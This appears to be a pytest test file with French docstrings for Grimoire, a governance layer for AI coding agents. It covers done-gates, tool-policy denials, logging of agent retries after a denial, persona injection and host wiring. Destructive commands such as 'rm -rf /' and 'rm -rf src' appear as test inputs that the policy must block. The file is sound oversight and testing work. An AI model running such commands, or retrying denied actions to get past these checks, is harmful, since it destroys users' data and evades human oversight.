        v2 = evaluate_done_gate(hook, "bootstrap", "governed", now_iso="2026-01-01T00:00:30+00:00")
        assert v2.blocked is False
        assert v2.capped is True

        # 61 s after v1: cooldown cleared, session count goes 1 -> 2.
        v3 = evaluate_done_gate(hook, "bootstrap", "governed", now_iso="2026-01-01T00:01:01+00:00")
        assert v3.blocked is True
        assert v3.capped is False

        # 61 s after v3: cooldown cleared again, session count goes 2 -> 3.
        v4 = evaluate_done_gate(hook, "bootstrap", "governed", now_iso="2026-01-01T00:02:02+00:00")
        assert v4.blocked is True
        assert v4.capped is False

        # 61 s after v4: cooldown clear, but the session cap (3) is reached.
        v5 = evaluate_done_gate(hook, "bootstrap", "governed", now_iso="2026-01-01T00:03:03+00:00")
        assert v5.blocked is False
        assert v5.capped is True
    finally:
        del os.environ["GRIMOIRE_DONE_GATE"]


def test_done_gate_option_in_standard_profile_also_enforces(governed: Path) -> None:
    """L'option de projet (``standard-profile.yaml``) marche sans variable d'environnement."""
    import io

    from ruamel.yaml import YAML

    _set_task_in_progress(governed)
    _make_gates_green(governed)
    _append_bash_event(governed, "bootstrap", "pytest -q", 0)
    _append_write_event(governed, "bootstrap", "src/foo.py")
    profile_path = governed / "_grimoire/standard/standard-profile.yaml"
    yaml = YAML()
    data = yaml.load(profile_path.read_text(encoding="utf-8")) or {}
    data["options"] = {"done_gate": "enforce"}
    stream = io.StringIO()
    yaml.dump(data, stream)
    profile_path.write_text(stream.getvalue(), encoding="utf-8")
    decision = decide_evidence_gate(HookInput(event=HookEvent.STOP, project_root=governed, session_id="s-opt"))
    assert decision.outcome is Outcome.BLOCK
    assert decision.detail["done_gate"]["blocked"] is True


def test_done_gate_ignores_a_bash_command_scoped_entirely_outside_the_project_root(governed: Path) -> None:
    """2026-09-29 false positive : la seule mutation observée était `git -C <hors racine> push`.

    L'« ailleurs » est un chemin littéral fixe, jamais dérivé de ``governed``
    (un ``tmp_path`` pytest réel s'appelle ``/tmp/pytest-of-<user>/pytest-<N>/…``
    — y dériver un chemin « hors racine » y ferait apparaître le mot
    ``pytest`` en sous-chaîne et ferait classer la commande en ``test_run``
    plutôt qu'en ``bash``, ce qui fausserait ce test).
    """
    _set_task_in_progress(governed)
    _make_gates_green(governed)
    _append_bash_event(governed, "bootstrap", "pytest -q", 0)
    _append_bash_event(governed, "bootstrap", "git -C /var/tmp/grimoire-calib-fixture/other-repo push", None)
    decision = decide_evidence_gate(HookInput(event=HookEvent.STOP, project_root=governed))
    assert decision.detail["done_gate"]["stale"] is False
    assert decision.detail["done_gate"]["reason"] == "no_mutation"


def test_done_gate_ignores_an_edit_whose_absolute_path_is_outside_the_project_root(governed: Path) -> None:
    _set_task_in_progress(governed)
    _make_gates_green(governed)
    _append_bash_event(governed, "bootstrap", "pytest -q", 0)
    _append_write_event(governed, "bootstrap", "/var/tmp/grimoire-calib-fixture/other-repo/script.py")
    decision = decide_evidence_gate(HookInput(event=HookEvent.STOP, project_root=governed))
    assert decision.detail["done_gate"]["stale"] is False
    assert decision.detail["done_gate"]["reason"] == "no_mutation"


def test_done_gate_still_flags_an_edit_under_the_project_root_given_as_an_absolute_path(governed: Path) -> None:
    """Non-régression : un vrai ``Edit``/``Write`` envoie toujours un chemin absolu."""
    _set_task_in_progress(governed)
    _make_gates_green(governed)
    _append_bash_event(governed, "bootstrap", "pytest -q", 0)
    _append_write_event(governed, "bootstrap", str(governed / "src" / "foo.py"))
    decision = decide_evidence_gate(HookInput(event=HookEvent.STOP, project_root=governed))
    assert decision.detail["done_gate"]["stale"] is True


def test_done_gate_still_flags_an_ambiguous_bash_command_with_no_identifiable_target(governed: Path) -> None:
    """Jamais échouer ouvert : sans cible identifiable, la commande compte comme mutation."""
    _set_task_in_progress(governed)
    _make_gates_green(governed)
    _append_bash_event(governed, "bootstrap", "pytest -q", 0)
    _append_bash_event(governed, "bootstrap", "python3 script.py output.txt", 0)
    decision = decide_evidence_gate(HookInput(event=HookEvent.STOP, project_root=governed))
    assert decision.detail["done_gate"]["stale"] is True


def test_done_gate_ignores_a_compound_command_whose_two_targets_are_both_outside_root(governed: Path) -> None:
    """Incident réel #2 (2026-09-29) : `python3 script.py <hors racine> && git -C <hors racine> push`."""
    _set_task_in_progress(governed)
    _make_gates_green(governed)
    _append_bash_event(governed, "bootstrap", "pytest -q", 0)
    _append_bash_event(
        governed,
        "bootstrap",
        "python3 script.py /var/tmp/grimoire-calib-fixture/other-repo 0 "
        "&& git -C /var/tmp/grimoire-calib-fixture/other-repo push",
        None,
    )
    decision = decide_evidence_gate(HookInput(event=HookEvent.STOP, project_root=governed))
    assert decision.detail["done_gate"]["stale"] is False
    assert decision.detail["done_gate"]["reason"] == "no_mutation"


def test_done_gate_ignores_a_heredoc_write_outside_root_even_if_its_body_mentions_an_in_root_path() -> None:
    """Incidents réels #3/#4 (2026-09-29) : `cat >> /tmp/.../notes.md <<'EOF' ... EOF`.

    Le corps du heredoc peut librement citer un chemin du projet (une note,
    un extrait de log) sans que ça fasse de l'écriture vers ``/tmp`` une
    mutation du projet — lire la ligne brute plutôt que
    ``command_surface`` (qui élague déjà corps de heredoc et texte cité)
    faisait lire cette mention comme une deuxième cible, mélange
    dedans/dehors qui gardait, à tort, l'écriture comptée.

    Racine de projet construite dans un ``tempfile.TemporaryDirectory()``
    manuel plutôt que la fixture ``governed`` (``tmp_path`` pytest) : un
    ``tmp_path`` réel s'appelle ``/tmp/pytest-of-<user>/pytest-<N>/…`` — y
    citer un chemin absolu, ne serait-ce que dans un corps de heredoc,
    ferait apparaître le mot ``pytest`` en sous-chaîne et classerait toute
    la commande en ``test_run`` (voir ``is_test_command``), masquant le
    scénario que ce test vérifie pour une tout autre raison que le
    correctif.
    """
    import tempfile

    with tempfile.TemporaryDirectory() as td:
        project = Path(td) / "project"
        project.mkdir()
        _write_agent(project, "concierge", "Tu tries et tu routes.")
        setup_standard_profile(project, profile_id="governed", task_id="bootstrap")
        _set_task_in_progress(project)
        _make_gates_green(project)
        _append_bash_event(project, "bootstrap", "pytest -q", 0)
        heredoc_command = (
            "cat >> /tmp/grimoire-calib-fixture/notes.md << 'EOF'\n"
            f"Voir {project / 'src' / 'grimoire' / 'foo.py'} pour le contexte\n"
            "EOF"
        )
        _append_bash_event(project, "bootstrap", heredoc_command, None)
        decision = decide_evidence_gate(HookInput(event=HookEvent.STOP, project_root=project))
    assert decision.detail["done_gate"]["stale"] is False
    assert decision.detail["done_gate"]["reason"] == "no_mutation"


def test_done_gate_ignores_a_turn_with_only_reads_after_an_earlier_out_of_root_background_push(
    governed: Path,
) -> None:
    """Incident réel #5 (2026-09-29) : un tour sans écriture, avec seulement `cat`/`gh pr view`.

    La seule mutation du journal vient d'une commande Bash lancée en
    arrière-plan *plus tôt* (``git -C <worktree hors racine> push``) — le
    hook ``PostToolUse`` la journalise au lancement, avec la commande
    complète déjà connue à cet instant (voir le docstring du module) ; la
    même exclusion « hors racine » s'applique, qu'elle vienne du tour
    courant ou d'un tour précédent de la même tâche.
    """
    _set_task_in_progress(governed)
    _make_gates_green(governed)
    _append_bash_event(governed, "bootstrap", "pytest -q", 0)
    _append_bash_event(
        governed, "bootstrap", "git -C /var/tmp/grimoire-calib-fixture/other-repo push &", None
    )
    _append_bash_event(governed, "bootstrap", "cat README.md", 0)
    _append_bash_event(governed, "bootstrap", "gh pr view 678", 0)
    decision = decide_evidence_gate(HookInput(event=HookEvent.STOP, project_root=governed))
    assert decision.detail["done_gate"]["stale"] is False
    assert decision.detail["done_gate"]["reason"] == "no_mutation"


# ── Calibration (Refs #644, party-mode idée B) ───────────────────────────────


def _calibration(governed: Path):
    from grimoire.core.standard_generation import TRACES_DIR
    from grimoire.traces.ledger import TraceLedger

    return TraceLedger(governed / TRACES_DIR).policy_hold_calibration()


def test_a_tool_policy_deny_is_journaled_as_a_policy_hold(governed: Path) -> None:
    decision = decide_tool_policy(
        HookInput(
            event=HookEvent.PRE_TOOL_USE,
            project_root=governed,
            tool_name="Bash",
            tool_input={"command": "rm -rf src"},
            session_id="s-calib-1",
        )
    )
    assert decision.outcome is Outcome.DENY
    report = _calibration(governed)
    assert report["groups"] == [
        {
            "hook": "grimoire.tool-policy",
            "reason": "tool_policy:deny",
            "total": 1,
            "labels": {"respected": 0, "retried_same": 0, "retried_variant": 0, "abandoned": 1},
        }
    ]


def test_a_tool_policy_allow_is_never_journaled(governed: Path) -> None:
    from grimoire.core.standard_generation import TRACES_DIR

    decision = decide_tool_policy(
        HookInput(
            event=HookEvent.PRE_TOOL_USE,
            project_root=governed,
            tool_name="Read",
            tool_input={"file_path": "README.md"},
            session_id="s-calib-allow",
        )
    )
    assert decision.outcome is Outcome.ALLOW
    assert not (governed / TRACES_DIR / "traces.jsonl").exists()


def test_a_stale_done_gate_verdict_is_journaled_as_a_policy_hold(governed: Path) -> None:
    _set_task_in_progress(governed)
    _make_gates_green(governed)
    _append_bash_event(governed, "bootstrap", "pytest -q", 0)
    _append_write_event(governed, "bootstrap", "src/foo.py")
    decision = decide_evidence_gate(
        HookInput(event=HookEvent.STOP, project_root=governed, session_id="s-calib-2")
    )
    assert decision.detail["done_gate"]["stale"] is True
    report = _calibration(governed)
    assert report["groups"] == [
        {
            "hook": "grimoire.evidence-gate",
            "reason": "done_gate:stale",
            "total": 1,
            "labels": {"respected": 0, "retried_same": 0, "retried_variant": 0, "abandoned": 1},
        }
    ]


def test_a_denied_command_retried_verbatim_is_labelled_retried_same(governed: Path) -> None:
    session_id = "s-calib-3"
    decide_tool_policy(
        HookInput(
            event=HookEvent.PRE_TOOL_USE,
            project_root=governed,
            tool_name="Bash",
            tool_input={"command": "rm -rf src"},
            session_id=session_id,
        )
    )
    decide_evidence_trace(
        HookInput(
            event=HookEvent.POST_TOOL_USE,
            project_root=governed,
            tool_name="Bash",
            tool_input={"command": "rm -rf src"},
            tool_response={"exit_code": 0},
            session_id=session_id,
        )
    )
    report = _calibration(governed)
    assert report["groups"][0]["labels"] == {
        "respected": 0, "retried_same": 1, "retried_variant": 0, "abandoned": 0,
    }


def test_a_denied_command_followed_by_something_unrelated_is_respected(governed: Path) -> None:
    session_id = "s-calib-4"
    decide_tool_policy(
        HookInput(
            event=HookEvent.PRE_TOOL_USE,
            project_root=governed,
            tool_name="Bash",
            tool_input={"command": "rm -rf src"},
            session_id=session_id,
        )
    )
    decide_evidence_trace(
        HookInput(
            event=HookEvent.POST_TOOL_USE,
            project_root=governed,
            tool_name="Read",
            tool_input={"file_path": "README.md"},
            session_id=session_id,
        )
    )
    report = _calibration(governed)
    assert report["groups"][0]["labels"] == {
        "respected": 1, "retried_same": 0, "retried_variant": 0, "abandoned": 0,
    }


def test_a_subagent_gate_that_cannot_be_evaluated_says_so(governed: Path) -> None:
    (governed / "_grimoire/standard/task-board.yaml").write_text("[oups", encoding="utf-8")
    decision = decide_subagent_gate(HookInput(event=HookEvent.SUBAGENT_STOP, project_root=governed))
    assert decision.outcome is Outcome.ALLOW
    assert "non évaluables" in decision.context


def test_a_capsule_survives_gates_that_cannot_be_evaluated(governed: Path) -> None:
    """La compaction est le moment où l'on perd tout ; la capsule dit ce qu'elle sait."""
    (governed / "_grimoire/standard/task-board.yaml").write_text("[oups", encoding="utf-8")
    decision = decide_context_capsule(HookInput(event=HookEvent.PRE_COMPACT, project_root=governed))
    assert "non évaluables" in decision.context
    assert "governed" in decision.context


# ── Wire format ──────────────────────────────────────────────────────────────


def test_event_names_are_accepted_in_every_spelling() -> None:
    assert parse_event("PreToolUse") is HookEvent.PRE_TOOL_USE
    assert parse_event("pre_tool_use") is HookEvent.PRE_TOOL_USE
    assert parse_event("pre-tool-use") is HookEvent.PRE_TOOL_USE
    assert parse_event("inconnu") is None


def test_payload_keys_are_read_in_both_casings(tmp_path: Path) -> None:
    snake = normalize_input({"hook_event_name": "PreToolUse", "tool_name": "Bash", "cwd": str(tmp_path)})
    camel = normalize_input({"hookEventName": "PreToolUse", "toolName": "Bash", "cwd": str(tmp_path)})
    assert snake.tool_name == camel.tool_name == "Bash"
    assert snake.event is camel.event is HookEvent.PRE_TOOL_USE


def test_the_host_tool_call_id_is_read_in_every_casing(tmp_path: Path) -> None:
    base = {"hook_event_name": "PostToolUse", "cwd": str(tmp_path)}
    assert normalize_input({**base, "tool_use_id": "toolu_1"}).tool_use_id == "toolu_1"
    assert normalize_input({**base, "toolUseId": "toolu_2"}).tool_use_id == "toolu_2"
    assert normalize_input(base).tool_use_id == ""


def test_the_same_refusal_reaches_both_blocking_hosts(governed: Path) -> None:
    _set_task_in_progress(governed)
    (governed / "_grimoire-output/context/bootstrap/context-bundle.yaml").unlink(missing_ok=True)
    payload = {"hook_event_name": "Stop", "cwd": str(governed)}
    claude, claude_decision, _ = run_hook(payload, host_id=HostId.CLAUDE_CODE_CLI)
    copilot, copilot_decision, _ = run_hook(payload, host_id=HostId.GITHUB_COPILOT)
    assert claude["decision"] == copilot["decision"] == "block"
    assert claude["reason"] == copilot["reason"]
    assert claude_decision.reason == copilot_decision.reason


def test_a_host_without_blocking_hooks_gets_context_not_a_refusal(governed: Path) -> None:
    _set_task_in_progress(governed)
    (governed / "_grimoire-output/context/bootstrap/context-bundle.yaml").unlink(missing_ok=True)
    rendered, decision, hook = run_hook({"hook_event_name": "Stop", "cwd": str(governed)}, host_id=HostId.CODEX)
    assert "decision" not in rendered
    assert decision.outcome is Outcome.BLOCK  # the rule is the same...
    assert render(decision, hook, HostId.CODEX) == rendered  # ...only the wiring differs


def test_pre_tool_use_renders_a_permission_decision(governed: Path) -> None:
    rendered, _, _ = run_hook(
        {
            "hook_event_name": "PreToolUse",
            "cwd": str(governed),
            "tool_name": "Bash",
            "tool_input": {"command": "rm -rf /"},
        },
        host_id=HostId.CLAUDE_CODE_CLI,
    )
    assert rendered["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_the_compaction_capsule_outlives_the_context(governed: Path) -> None:
    rendered, _, _ = run_hook({"hook_event_name": "PreCompact", "cwd": str(governed)}, host_id=HostId.CLAUDE_CODE_CLI)
    capsule = governed / "_grimoire-output/context/bootstrap/compaction-capsule.md"
    assert capsule.is_file()
    assert "bootstrap" in capsule.read_text(encoding="utf-8")
    assert "systemMessage" in rendered


def test_a_capsule_that_could_not_be_written_is_not_claimed_written(governed: Path) -> None:
    """Le message système disait « capsule écrite » même quand le disque avait refusé."""
    dest = governed / "_grimoire-output/context/bootstrap/compaction-capsule.md"
    dest.mkdir(parents=True)  # un dossier à la place du fichier : l'écriture échoue
    rendered, decision, _ = run_hook(
        {"hook_event_name": "PreCompact", "cwd": str(governed)}, host_id=HostId.CLAUDE_CODE_CLI
    )
    assert "capsule" not in decision.detail
    assert decision.detail["capsule_error"]
    assert "non écrite" in rendered["systemMessage"]
    assert not rendered["systemMessage"].startswith("[Grimoire] capsule de gouvernance écrite")


def _crash(_hook: HookInput) -> Decision:
    raise RuntimeError("moteur de politique cassé")


def test_a_crashing_policy_asks_instead_of_allowing(governed: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Une garde qui plante n'est pas une garde qui autorise.

    Avant : l'exception devenait ``permissionDecision: allow`` — l'hôte
    n'affiche pas ``additionalContext`` sur PreToolUse, donc l'auto-approbation
    ne laissait aucune trace visible.
    """
    monkeypatch.setitem(DECISIONS, "grimoire.tool-policy", _crash)
    payload = {
        "hook_event_name": "PreToolUse",
        "cwd": str(governed),
        "tool_name": "Bash",
        "tool_input": {"command": "rm -rf build"},
    }
    claude, decision, _ = run_hook(payload, host_id=HostId.CLAUDE_CODE_CLI)
    assert decision.outcome is Outcome.ASK
    assert claude["hookSpecificOutput"]["permissionDecision"] == "ask"
    assert "moteur de politique cassé" in claude["hookSpecificOutput"]["permissionDecisionReason"]
    copilot, _, _ = run_hook(payload, host_id=HostId.CODEX)
    assert "moteur de politique cassé" in copilot["hookSpecificOutput"]["additionalContext"]


def test_a_crashing_non_tool_decision_keeps_the_session_and_says_so(
    governed: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setitem(DECISIONS, "grimoire.task-context", _crash)
    rendered, decision, _ = run_hook(
        {"hook_event_name": "UserPromptSubmit", "cwd": str(governed)}, host_id=HostId.CLAUDE_CODE_CLI
    )
    assert decision.outcome is Outcome.ALLOW
    assert "moteur de politique cassé" in rendered["hookSpecificOutput"]["additionalContext"]


def test_a_non_blocking_stop_verdict_is_still_visible(project: Path) -> None:
    """Sur Stop, l'hôte ne lit pas ``additionalContext`` : un verdict non
    bloquant qui n'y vivait qu'en contexte était un verdict que personne ne
    voyait."""
    setup_standard_profile(project, profile_id="orchestrated", task_id="bootstrap")
    _set_task_in_progress(project)
    (project / "_grimoire-output/context/bootstrap/context-bundle.yaml").unlink(missing_ok=True)
    rendered, decision, _ = run_hook({"hook_event_name": "Stop", "cwd": str(project)}, host_id=HostId.CLAUDE_CODE_CLI)
    assert decision.outcome is Outcome.ALLOW
    assert "rouges" in rendered["systemMessage"]


# ── Capabilities ─────────────────────────────────────────────────────────────


def test_host_aliases_resolve() -> None:
    assert resolve_host("claude") is HostId.CLAUDE_CODE_CLI
    assert resolve_host("host-github-copilot") is HostId.GITHUB_COPILOT
    assert resolve_host("nawak") is None


def test_every_gap_names_its_fallback() -> None:
    for host_id in supported_hosts():
        for gap in gaps_for(profile_for(host_id)):
            assert gap.fallback, f"{host_id.value}/{gap.surface} dégrade sans repli déclaré"


def _copilot_hook_plan(project: Path) -> tuple[object, object]:
    """Le plan Copilot et son premier fichier de hook."""
    emitter = emitter_for(HostId.GITHUB_COPILOT)
    plan = emitter.plan(build_surface(project), project)
    hooks = [f for f in plan.files if f.relpath.as_posix().startswith(".github/hooks/grimoire-")]
    assert hooks, "le plan Copilot doit émettre au moins un fichier de hook"
    return plan, hooks[0]


_HAND_WRITTEN_HOOK = (
    '{"hooks": {"SessionStart": [{"type": "command", "command": "MAISON-NE-PAS-ECRASER.sh", "timeout": 10}]}}\n'
)


def test_copilot_sync_preserves_a_hand_written_hook(project: Path) -> None:
    """Un hook écrit à la main survit au sync, comme un agent écrit à la main.

    L'émetteur Copilot posait ``managed=False`` sur ses fichiers de hook, ce
    qui désactivait entièrement le contrôle de préservation : le drapeau
    confondait « ne peut pas porter de marqueur de gestion » — un JSON n'a pas
    de commentaires — avec « peut être écrasé sans prévenir ». Un projet ayant
    sa propre chaîne de gouvernance la perdait au premier sync, sans message
    et sans sauvegarde.
    """
    plan, hook = _copilot_hook_plan(project)
    target = project / hook.relpath
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(_HAND_WRITTEN_HOOK, encoding="utf-8")

    result = apply_plan(plan, project)

    assert target.read_text(encoding="utf-8") == _HAND_WRITTEN_HOOK
    assert hook.relpath.as_posix() in result.skipped


def test_copilot_sync_still_updates_its_own_hook(project: Path) -> None:
    """Garde-fou : le kit doit continuer à mettre à jour ce qu'il a écrit."""
    plan, hook = _copilot_hook_plan(project)
    target = project / hook.relpath
    target.parent.mkdir(parents=True, exist_ok=True)
    stale = (
        json.dumps(
            {"hooks": {"SessionStart": [{"type": "command", "command": "grimoire-hook --host copilot", "timeout": 5}]}},
            indent=2,
        )
        + "\n"
    )
    target.write_text(stale, encoding="utf-8")

    result = apply_plan(plan, project)

    assert target.read_text(encoding="utf-8") == hook.content
    assert hook.relpath.as_posix() in result.written


def test_copilot_sync_force_overwrites_a_hand_written_hook(project: Path) -> None:
    """``--force`` reste la porte de sortie, comme pour les agents."""
    plan, hook = _copilot_hook_plan(project)
    target = project / hook.relpath
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(_HAND_WRITTEN_HOOK, encoding="utf-8")

    apply_plan(plan, project, force=True)

    assert target.read_text(encoding="utf-8") == hook.content


# ── Persona d'entrée ─────────────────────────────────────────────────────────


def _session_start(root: Path) -> str:
    return decide_activation(HookInput(event=HookEvent.SESSION_START, project_root=root)).context


def test_the_entry_persona_reaches_the_session_start_context(project: Path) -> None:
    """Le contrat entier : la désignation `entry_point` sort du hook."""
    context = _session_start(project)
    assert "concierge" in context, "la persona d'entrée n'atteint pas la session"
    assert "_grimoire/_config/custom/agents/concierge.md" in context, "sans chemin, rien à lire"
    assert "scribe" not in context, "seule la persona d'entrée est injectée"


def test_the_entry_persona_is_a_one_line_summary_not_a_full_read_mandate(project: Path) -> None:
    """Issue #582 lot C : plus de mandat de lecture intégrale sur chaque session.

    Le diagnostic du surcoût kit (banc à trois bras, 2026-09-17, §1.2.1) a
    mesuré ce mandat à ~2 800 tokens pour `concierge.md` (11 Ko), imposé sur
    *toute* session — y compris une session batch (`claude -p`) qui a déjà
    reçu sa tâche en entier et n'a personne à trier. `HookInput` ne porte
    aujourd'hui aucun signal interactif/batch fiable (pas de TTY, rien qui
    survive dans le sous-processus du hook) : le résumé s'applique donc
    partout, documenté dans `entry_persona_context`.
    """
    text, name = entry_persona_context(project)
    assert name == "concierge"
    assert "en entier avant de répondre" not in text
    assert "en entier" in text and "ambiguë" in text, "le renvoi conditionnel au fichier complet doit rester"
    assert "concierge" in text
    assert "_grimoire/_config/custom/agents/concierge.md" in text
    # Le résumé doit rester très inférieur au mandat de lecture intégrale
    # qu'il remplace (~2 800 tokens, mesurés par le diagnostic).
    assert len(text) < 500, len(text)


def test_claude_session_start_carries_the_dispatch_policy_and_roster(project: Path) -> None:
    """#655 : la boucle principale Claude Code voit la politique de
    dispatch et le répertoire routable à chaque session, pas seulement
    quand elle lit `concierge.md` en entier.

    Avant le correctif, `decide_activation` ne portait ni la politique
    V0/V1/V2 ni aucun `subagent_type` : seul le fichier sous-agent de
    l'entrée les documentait, et rien ne les lisait jamais depuis la boucle
    principale.
    """
    _, decision, _ = run_hook(
        {"hook_event_name": "SessionStart", "cwd": str(project)}, host_id=HostId.CLAUDE_CODE_CLI
    )
    context = decision.context
    assert "Politique de dispatch" in context
    assert "V0" in context and "haiku" in context
    assert "V1" in context and "sonnet" in context
    assert "V2" in context and "le modèle de la session" in context
    # `scribe` (reasoning=low par défaut du fixture `project`) est routable ;
    # `concierge` (l'entrée) ne doit pas s'y lister lui-même.
    assert "`scribe` → `haiku`" in context or "`scribe` →" in context
    assert "subagent_type" in context
    assert decision.detail["dispatch_context_injected"] is True


def test_non_claude_hosts_do_not_get_the_claude_dispatch_context(project: Path) -> None:
    """Non-régression Copilot (#655) : `decide_activation` est partagé
    entre hôtes ; la politique de dispatch et le répertoire `subagent_type`
    n'ont de sens que pour Claude Code et ne doivent apparaître ni pour
    Copilot ni pour un hôte inconnu."""
    _, copilot_decision, _ = run_hook(
        {"hook_event_name": "SessionStart", "cwd": str(project)}, host_id=HostId.GITHUB_COPILOT
    )
    assert "Politique de dispatch" not in copilot_decision.context
    assert copilot_decision.detail["dispatch_context_injected"] is False


def test_the_roster_default_model_is_explicitly_subordinate_to_the_task_class(project: Path) -> None:
    """#662 : le répertoire `subagent_type` → modèle par défaut de
    la persona (ex. `scribe` → `haiku`) est injecté juste sous la « Politique
    de dispatch » (classe de la tâche → modèle) sans qu'aucune phrase ne
    tranche entre les deux — les deux règles semblent se contredire pour qui
    ne devine pas que le roster n'est que le défaut appliqué quand `model=` est omis."""
    _, decision, _ = run_hook(
        {"hook_event_name": "SessionStart", "cwd": str(project)}, host_id=HostId.CLAUDE_CODE_CLI
    )
    context = decision.context
    roster_index = context.index("Personas routables")
    priority_index = context.index("la classe de la sous-tâche déléguée prime")
    assert priority_index > roster_index, "la phrase de priorité doit suivre le roster, pas le précéder"


def test_collect_agents_runs_once_per_claude_session_start(project: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """#662 : `entry_persona_context` et `_claude_dispatch_context`
    appelaient chacune `collect_agents` au même `SessionStart` (mesuré
    ~35 ms + ~16 ms sur la Forge) — le même inventaire d'agents, recalculé
    deux fois."""
    import grimoire.hosts.collect as collect_module

    calls = 0
    original = collect_module.collect_agents

    def counting(*args: object, **kwargs: object) -> tuple:
        nonlocal calls
        calls += 1
        return original(*args, **kwargs)

    monkeypatch.setattr(collect_module, "collect_agents", counting)

    run_hook({"hook_event_name": "SessionStart", "cwd": str(project)}, host_id=HostId.CLAUDE_CODE_CLI)

    assert calls == 1, f"collect_agents appelé {calls} fois au lieu d'une seule"

    # Sans host_id du tout (appel direct, comme le fait le reste de la suite) :
    # même comportement, jamais la section Claude.
    bare_context = _session_start(project)
    assert "Politique de dispatch" not in bare_context


def test_claude_session_start_survives_an_unreadable_agent_inventory(
    project: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """#662 : un inventaire illisible (``OSError``) ne casse pas le hook — ni
    persona ni politique, le reste du contexte ``SessionStart`` passe."""
    import grimoire.hosts.collect as collect_module

    def unreadable(*args: object, **kwargs: object) -> tuple:
        raise OSError("inventaire illisible")

    monkeypatch.setattr(collect_module, "collect_agents", unreadable)

    _rendered, decision, _hook = run_hook(
        {"hook_event_name": "SessionStart", "cwd": str(project)}, host_id=HostId.CLAUDE_CODE_CLI
    )
    context = decision.context

    assert "Politique de dispatch" not in context
    assert "persona d'entrée" not in context


def test_the_entry_persona_tool_boundary_no_longer_reads_as_binding_the_main_loop(project: Path) -> None:
    """#655, point 2 : la frontière d'outils du résumé ne doit
    plus se lire comme si elle bornait la boucle principale elle-même —
    seul le sous-agent d'entrée, s'il tourne isolément, y est vraiment
    borné."""
    text, _ = entry_persona_context(project)
    assert "Tu gardes tous les outils de l'hôte" in text
    assert "ne vaut que si concierge tourne en sous-agent" in text
    # Toujours un résumé, pas un mandat de lecture intégrale.
    assert len(text) < 500, len(text)


def test_the_validated_directive_survives_the_persona(governed: Path) -> None:
    """La persona s'ajoute au standard, elle ne le remplace pas — sur un projet gouverné.

    Le mécanisme d'activation a été mesuré 40/40 contre 0/40. L'écraser pour
    faire de la place à une persona échangerait un effet prouvé contre un
    effet supposé. Depuis le diagnostic du 2026-09-17 (Grimoire-kit#551
    #552), cette garantie ne vaut plus que pour un projet réellement
    gouverné (fixture ``governed``) — un projet nu reçoit désormais l'avis
    court, voir ``test_an_ungoverned_project_gets_the_short_notice_instead``.
    """
    context = _session_start(governed)
    assert "[Grimoire Standard]" in context
    assert context.index("[Grimoire — persona d'entrée]") < context.index("[Grimoire Standard]")


def test_a_project_without_an_entry_persona_keeps_the_bare_directive(tmp_path: Path) -> None:
    """Sur un projet gouverné sans persona d'entrée, la directive complète reste seule."""
    _write_minimal_task_board(tmp_path)
    _write_agent(tmp_path, "scribe", "Tu rédiges la documentation.")
    assert entry_persona_context(tmp_path) == ("", "")
    assert _session_start(tmp_path) == activation_context_text(tmp_path, task_id="bootstrap")


def test_an_ungoverned_project_gets_the_short_notice_instead(tmp_path: Path) -> None:
    """Le coeur du correctif #551/#552 : pas de standard adopté, pas de directive complète.

    Reproduit le cas du diagnostic — un dépôt qui n'a jamais vu
    ``grimoire standard init`` (donc pas de ``_grimoire/standard/`` du tout)
    ne doit plus recevoir le mandat enveloppe/pack de preuve/gate/verify : il
    n'a jamais eu de commande pour créer ces artefacts, et ``verify`` y
    échouerait immédiatement sur 7 artefacts que personne n'a demandé de
    produire (diagnostic-surcout-kit-2026-09-17.md, §1.2).
    """
    _write_agent(tmp_path, "scribe", "Tu rédiges la documentation.")
    context = _session_start(tmp_path)
    assert "[Grimoire Standard]" not in context
    assert "task-envelope.md" not in context
    assert "gate check --task-id" not in context
    assert "[Grimoire — projet non gouverné]" in context
    # Le court-circuit doit rester court : plus court que la directive
    # gouvernée complète. Depuis le lot G3 (issue #582), cette dernière tient
    # elle-même en moins de 400 caractères (un seul mandat, `gate check
    # --strict` absorbe scaffold et tests) — l'écart n'est donc plus du
    # simple au double, mais l'invariant reste : le court-circuit ne doit
    # jamais dépasser la directive qu'il remplace.
    short_len = len(context)
    governed_len = len(activation_context_text(tmp_path, task_id="bootstrap"))
    assert short_len < 400
    assert short_len < governed_len


def test_the_hook_names_the_persona_it_injected(project: Path) -> None:
    """Sans trace dans `detail`, une injection muette est indistinguable d'une absence."""
    rendered, decision, _ = run_hook(
        {"hook_event_name": "SessionStart", "cwd": str(project)}, host_id=HostId.CLAUDE_CODE_CLI
    )
    assert decision.detail["entry_agent"] == "concierge"
    assert "concierge" in rendered["hookSpecificOutput"]["additionalContext"]


def test_session_start_does_not_error_when_the_entry_persona_has_attached_skills(
    project: Path,
) -> None:
    """Régression #423, reproduite en conditions réelles.

    Un projet d'archétype ``meta`` porte un agent (``agent-optimizer``) qui
    déclare quatre skills attachés par défaut — la forme par défaut des
    archétypes depuis #377/#387. Avant le correctif, ``SessionStart``
    répondait « hook grimoire.activation en erreur » sur *tout* projet de ce
    type, parce qu'``entry_persona_context`` appelait ``collect_agents``
    sans lui donner l'inventaire des skills. Ici l'agent à skills est aussi
    la persona d'entrée, le chemin le plus direct vers la régression.
    """
    _write_skill(project, "meta-art-direction")
    _write_agent(
        project,
        "agent-optimizer",
        "Tu arbitres la qualité des agents.",
        skills=("meta-art-direction",),
    )
    (project / "project-context.yaml").write_text(
        "project:\n  name: test-project\nagents:\n  entry: agent-optimizer\n",
        encoding="utf-8",
    )

    rendered, decision, _ = run_hook(
        {"hook_event_name": "SessionStart", "cwd": str(project)}, host_id=HostId.CLAUDE_CODE_CLI
    )
    context = rendered["hookSpecificOutput"]["additionalContext"]
    assert "en erreur" not in context, context
    assert "[Grimoire — persona d'entrée]" in context
    assert "agent-optimizer" in context
    assert decision.detail.get("entry_agent") == "agent-optimizer"


# ── Rappel de tâche au claim (#141) ─────────────────────────────────────────


def test_le_rappel_de_tache_n_est_jamais_injecte_sans_claim(project: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Contrôle négatif : une tâche active mais jamais réclamée ne rappelle rien.

    ``GRIMOIRE_TASK_ID`` force la tâche active sans passer par un claim — c'est
    exactement le cas que la boucle ne doit pas déclencher.
